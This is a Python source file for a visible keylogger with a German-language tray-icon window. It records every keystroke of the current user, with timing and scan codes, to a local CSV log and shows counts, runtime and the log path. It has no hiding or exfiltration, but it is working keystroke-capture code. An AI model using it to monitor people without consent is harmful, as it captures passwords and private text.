import datetime
import os
import sys
import time
from math import floor

import keyboard
import wx
import wx.adv

# ------------------------------------------------------------------------- #
#                             KEYLOGGER STUFF                               #
# ------------------------------------------------------------------------- #


CURRENT_USER = os.environ.get('USERNAME' if sys.platform == 'win32' else 'USER')
LOGFILE = os.path.abspath('.\\logs\\' + CURRENT_USER + '_keylog.csv')
monitoring_stats = {'keys pressed': 0, 'start time': time.time()}


def save(rerun=True):
    record = keyboard.stop_recording()
    if rerun:
        keyboard.start_recording()

    with open(LOGFILE, 'a') as file:
        for entry in record:
            file.write(str(entry.time))
            file.write(',')

            file.write(str(entry.scan_code))
            file.write(',')

            file.write('p' if entry.event_type == 'down' else 'r')
            file.write(',')

            file.write('1' if entry.is_keypad else '0')
            file.write(',')

            file.write(entry.name)
            file.write('\n')

    if rerun:
        monitoring_stats['keys pressed'] += len(record)
        app.txt_recorded_keys.SetLabel(str(monitoring_stats['keys pressed']))


def keylog_init():
    try:
        os.mkdir('.\\logs')
    except FileExistsError:
        pass

    if os.path.exists(LOGFILE):
        size = 0
        with open(LOGFILE) as log:
            for line in log.readlines():
                size += 1
        monitoring_stats['keys pressed'] = size - 1

    keyboard.start_recording()


# ------------------------------------------------------------------------- #
#                           UI (TRAY ICON) STUFF                            #
# ------------------------------------------------------------------------- #


tray_display_name = 'Logging... (' + CURRENT_USER + ')'
tray_display_name_paused = 'Paused logging of ' + CURRENT_USER
tray_icon = 'TrayIcon.ico'
tray_icon_paused = 'TrayIcon_paused.ico'


def add_menu_button(menu, name, target):
    bttn = wx.MenuItem(menu, -1, name)
    menu.Bind(wx.EVT_MENU, target, id=bttn.GetId())
    menu.Append(bttn)
    return bttn


class TrayIcon(wx.adv.TaskBarIcon):
    def __init__(self, frame):
        self.frame = frame
        super(TrayIcon, self).__init__()

        self.icon = wx.Icon(tray_icon)
        self.icon_paused = wx.Icon(tray_icon_paused)
        self.tooltip = tray_display_name
        self.tooltip_paused = tray_display_name_paused

        self.SetIcon(self.icon, self.tooltip)
        self.Bind(wx.adv.EVT_TASKBAR_LEFT_DOWN, self.open_frame)

    def CreatePopupMenu(self):
        menu = wx.Menu()
        add_menu_button(menu, 'Öffnen', self.open_frame)
        add_menu_button(menu, 'Beenden', self.on_exit)
        return menu

    def open_frame(self, _):
        global app
        app.frame.Show()

    def on_exit(self, _):
        self.Unbind(wx.adv.EVT_TASKBAR_LEFT_DOWN)
        self.Destroy()
        global app
        app.ExitMainLoop()


class KeyLogUI(wx.App):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.bttn_pause_lbl_pause = 'Aufzeichnung pausieren'
        self.bttn_pause_lbl_play = 'Aufzeichnung fortsetzen'

        self.frame = wx.Frame(parent=None, size=wx.Size(750, 200))
        pane = wx.Panel(parent=self.frame)

        wx.StaticText(parent=pane, pos=(100, 20), label='Dies ist ein Keylogger!')
        wx.StaticText(parent=pane, pos=(20, 40), label='-- Statistik --')
        wx.StaticText(parent=pane, pos=(20, 55), label='Aufgezeichnete Tastaturevents:')
        wx.StaticText(parent=pane, pos=(20, 70), label='Laufzeit (dieser Session):')
        wx.StaticText(parent=pane, pos=(20, 85), label='Speicherort der Logdateien:')

        self.txt_recorded_keys = \
            wx.StaticText(parent=pane, pos=(200, 55), label=str(monitoring_stats['keys pressed']))
        self.txt_time = \
            wx.StaticText(parent=pane, pos=(200, 70), label='0')
        wx.StaticText(parent=pane, pos=(200, 85), label=LOGFILE)

        self.bttn_exit = wx.Button(parent=pane, pos=(20, 110), label='Programm beenden')
        self.bttn_pause = wx.Button(parent=pane, pos=(200, 110), label=self.bttn_pause_lbl_pause)

        self.do_exit = False
        self.is_paused = False
        self.frame.Bind(wx.EVT_CLOSE, self.catch_exit)
        self.bttn_exit.Bind(wx.EVT_BUTTON, self.real_exit)
        self.bttn_pause.Bind(wx.EVT_BUTTON, self.pause_resume)

        self.tray_icon = TrayIcon(self.frame)

        self.save_timer = wx.Timer()
        self.save_timer.Bind(wx.EVT_TIMER, save)
        self.save_timer.Start(10_000)

        self.label_timer = wx.Timer()
        self.label_timer.Bind(wx.EVT_TIMER, self.display_time)
        self.label_timer.Start(1000)

        self.frame.Show()

    def catch_exit(self, event):
        if self.do_exit:
            self.tray_icon.Unbind(wx.adv.EVT_TASKBAR_LEFT_DOWN)
            self.tray_icon.Destroy()
            self.ExitMainLoop()
        else:
            self.frame.Show(False)
            event.Veto()

    def real_exit(self, _):
        self.do_exit = True
        self.frame.Close()

    def display_time(self, _):
        if self.frame.IsShown():
            active_time = datetime.timedelta(seconds=time.time() - monitoring_stats['start time'])
            days = active_time.days
            seconds = active_time.seconds

            hours = seconds // 3600
            seconds -= hours * 3600

            minutes = seconds // 60
            seconds -= minutes * 60

            if days > 0:
                self.txt_time.SetLabel(str(days) + ' Tag(e), ' + str(hours) + ' Stunde(n), ' + str(minutes) +
                                       ' Minute(n) und ' + str(seconds) + ' Sekunde(n)')
            elif hours > 0:
                self.txt_time.SetLabel(str(hours) + ' Stunde(n), ' + str(minutes) +
                                       ' Minute(n) und ' + str(seconds) + ' Sekunde(n)')
            elif minutes > 0:
                self.txt_time.SetLabel(str(minutes) + ' Minute(n) und ' + str(seconds) + ' Sekunde(n)')
            else:
                self.txt_time.SetLabel(str(seconds) + ' Sekunde(n)')

    def pause_resume(self, _):
        if self.is_paused:
            keyboard.start_recording()
            self.save_timer.Start()
            self.bttn_pause.SetLabel(self.bttn_pause_lbl_pause)
            self.tray_icon.SetIcon(self.tray_icon.icon, self.tray_icon.tooltip)
            self.is_paused = False
        else:
            save(rerun=False)
            self.save_timer.Stop()
            self.bttn_pause.SetLabel(self.bttn_pause_lbl_play)
            self.tray_icon.SetIcon(self.tray_icon.icon_paused, self.tray_icon.tooltip_paused)
            self.is_paused = True


if __name__ == '__main__':
    keylog_init()

    app = KeyLogUI()
    app.MainLoop()

    if not app.is_paused:
        save(rerun=False)
else:
    raise ImportWarning('Unintended used of ' + repr(__file__) + ' as a module')
